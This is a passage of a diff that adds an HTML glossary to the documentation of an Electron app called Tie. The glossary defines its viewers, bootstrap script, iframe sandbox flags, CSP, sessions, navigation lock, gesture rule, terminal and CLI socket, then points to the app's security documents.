+    <dt>Viewer</dt><dd>Tie's own page for a file kind, served under <code>/_tie/</code> on the tile's token. <code>src/viewers/</code>.</dd>
+    <dt>Bootstrap</dt><dd>Tie's script injected first into html documents: handshake, pong, link clicks and hovers. Not a boundary; page scripts share its realm.</dd>
+    <dt>Sandbox attribute</dt><dd>The iframe's <code>sandbox=</code> flags. Viewers get <code>allow-scripts</code> only; html adds <code>allow-same-origin</code>.</dd>
+    <dt>CSP</dt><dd>Content Security Policy: a response header listing what a page may load and run. Tie's are in <code>core/policy.ts</code>.</dd>
+    <dt>Session</dt><dd>Electron's cookie jar + network stack + protocol handlers. Shell and content share an in-memory one with no network; guests have <code>persist:browser</code>.</dd>
+    <dt>Nav lock</dt><dd>Main's rule for what URL a frame may navigate to: its token's viewer, or html pages of its root.</dd>
+    <dt>Gesture rule</dt><dd>Verbs that act for you are accepted only while the frame is focused by you.</dd>
+    <dt>Guest</dt><dd>A browser tile's <code>&lt;webview&gt;</code> web contents.</dd>
+    <dt>Pty</dt><dd>Pseudo-terminal. Main spawns your shell in one; xterm in the shell draws its output.</dd>
+    <dt>Socket</dt><dd><code>~/.config/tie/&lt;instance&gt;.sock</code>, 0600. The <code>tie</code> CLI's line to main. Full power for whoever can open it: your account.</dd>
+    <dt>Fuses</dt><dd>Electron build-time switches baked into the binary. Tie turns off the injection paths and keeps <code>runAsNode</code> for its CLI launcher.</dd>
+  </dl>
+  <p>Deeper, per topic: <code>docs/SECURITY.md</code> (guards and their tests), <code>docs/TILES.md</code> (frame host, requests, policy table), <code>docs/VIEWERS.md</code>, <code>docs/BROWSER.md</code>, <code>docs/2026-10-17-security-report.html</code> (findings and open decisions).</p>
+</section>
+</main>
